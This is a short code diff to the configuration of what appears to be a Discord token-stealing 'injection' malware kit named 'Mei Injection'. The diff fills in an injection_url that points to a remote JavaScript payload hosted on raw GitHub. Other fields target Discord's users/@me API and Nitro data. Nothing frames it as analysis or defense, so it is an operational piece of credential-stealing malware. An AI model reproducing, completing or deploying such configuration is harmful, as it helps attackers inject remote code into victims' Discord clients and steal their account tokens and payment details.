@@ -16,7 +16,7 @@ const config = {
   embed_name: 'Mei Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/1JBKLGyE6AnRGvk92A8x3m8qmXfh3fcEty.jpg?width=489&height=468', 
   embed_color: 0, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/meilegalizm1/sada/main/sex.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
